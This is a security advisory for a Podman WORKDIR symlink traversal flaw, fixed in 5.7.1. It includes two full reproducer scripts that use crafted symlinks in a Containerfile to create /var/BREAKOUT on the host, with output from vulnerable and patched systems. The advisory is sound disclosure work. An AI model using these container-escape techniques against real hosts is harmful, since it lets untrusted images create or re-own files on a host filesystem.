summary: "Podman: WORKDIR symlink traversal vulnerability\n### Summary\n\nRunning a malicous\
  \ container image where the WORKDIR path contains a symlink can create a directory or modify\
  \ ownership on the host filesystem. Modified ownership is less likely to happen as that requires\
  \ help from an untrusted/malicious process that mutates the host filesystem tree during dereferencing\
  \ of the WORKDIR path, to trigger a race condition.\n\n### Patch\n\nhttps://github.com/podman-container-tools/podman/commit/d18e44e9abb3bf5b7294aa70806e1368fdddfdd0\n\
  \n### Details\n\nThis issue was fixed in podman 5.7.1 (git commit 7ce2e00ab140c11a68301f0b161f51984131a858)\n\
  \n### PoC\n\nThe reproducer script _test1.bash_ demonstrates the vulnerability. \nThe directory\
  \  `/var/BREAKOUT` is created on the host.\nThe container process uses the container directory\
  \ `/var/BREAKOUT` as current working directory.\n\nThe reproducer script _test2.bash_ demonstrates\
  \ the same vulnerability. \nThe directory  `/var/BREAKOUT` is created on the host.\nThe container\
  \ process uses the container directory `/usr/local` as current working directory.\n\nThe reproducer\
  \ script _test2.bash_ shows that the working directory can be different from the breakout\
  \ directory.\n\nReproducer **test1.bash**\n\n```\n#!/bin/bash\nset -o errexit\nset -o nounset\n\
  \nif [ -e /var/BREAKOUT ]; then\n  echo error: path /var/BREAKOUT should not exist beforehand\n\
  \  exit 1\nfi\n\ndir=$(mktemp -d)\ncat > $dir/Containerfile << 'EOF'\nFROM docker.io/library/alpine\n\
  RUN cd / && ln -s ../../../../../../../var symlink\nUSER 1234:1234\nWORKDIR /symlink/BREAKOUT\n\
  CMD [\"/bin/sh\",\"-c\",\"echo current working directory: $(pwd)\"]\nEOF\n\npodman build -q\
  \ --no-cache -t img $dir\npodman run --rm localhost/img\nls -ld /var/BREAKOUT\n```\n\n\nReproducer\
  \ **test2.bash**\n\n```\n#!/bin/bash\nset -o errexit\nset -o nounset\n\nif [ -e /var/BREAKOUT\
  \ ]; then\n  echo error: path /var/BREAKOUT should not exist beforehand\n  exit 1\nfi\n\n\
  dir=$(mktemp -d)\ncat > $dir/Containerfile << 'EOF'\nFROM docker.io/library/alpine\nARG breakout_dirname=/var\n\
  ARG breakout_basename=BREAKOUT\nARG produce_pwd=/usr/local\nRUN mkdir -p /0/1/2/3 && \\\n\
  \    cd /0 && \\\n    ln -s 1/2/3 symlink1 && \\\n    mkdir -p /0/1/symlink2/${breakout_dirname}\
  \ && \\\n    cd /0/1/symlink2/${breakout_dirname} && \\\n    ln -s ${produce_pwd} ${breakout_basename}\n\
  RUN cd / && ln -s ../../../../../../.. symlink2\nUSER 1234:1234\nWORKDIR /0/symlink1/../../symlink2/${breakout_dirname}/${breakout_basename}\n\
  CMD [\"/bin/sh\",\"-c\",\"echo current working directory: $(pwd)\"]\nEOF\n\npodman build -q\
  \ --no-cache -t img $dir\npodman run --rm localhost/img\nls -ld /var/BREAKOUT\n```\n\n\n\n\
  Vulnerable:\n\npodman 5.7.0 using Fedora CoreOS 43.20251120.3.0\n\n```\nroot@localhost:~#\
  \ bash test1.bash \n38c27b69c61941741f49c3f87b589b422391d5908659665cabf248934be0ed80\ncurrent\
  \ working directory: /var/BREAKOUT\ndrwxr-xr-x. 2 1234 1234 6 May 29 19:28 /var/BREAKOUT\n\
  root@localhost:~# rmdir /var/BREAKOUT/\nroot@localhost:~# bash test2.bash \nc3390edbe393a3f3b182e60c5900cf93444b5120fbe34dc305478b3b77a106c9\n\
  current working directory: /usr/local\ndrwxr-xr-x. 2 1234 1234 6 May 29 19:28 /var/BREAKOUT\n\
  ```\n\nNot vulnerable:\n\npodman 5.7.1 using Fedora CoreOS 43.20260119.1.1\n\n```\nroot@localhost:~#\
  \ bash test1.bash \n0229bf752a821d5b9bb8afcf4b94e8de2a4838798ae8065414b7f939b81d0788\ncurrent\
  \ working directory: /var/BREAKOUT\nls: cannot access '/var/BREAKOUT': No such file or directory\n\
  root@localhost:~# bash test2.bash \n568584150a93a003feb8ae1985173bf50ced9cba4d52f9734cb70dc75eeb7c60\n\
  current working directory: /usr/local\nls: cannot access '/var/BREAKOUT': No such file or\
  \ directory\n```\n\n### Credits\n\nWe like to thank Erik Sjölund (@eriksjolund) for reporting\
  \ the security impact to us."
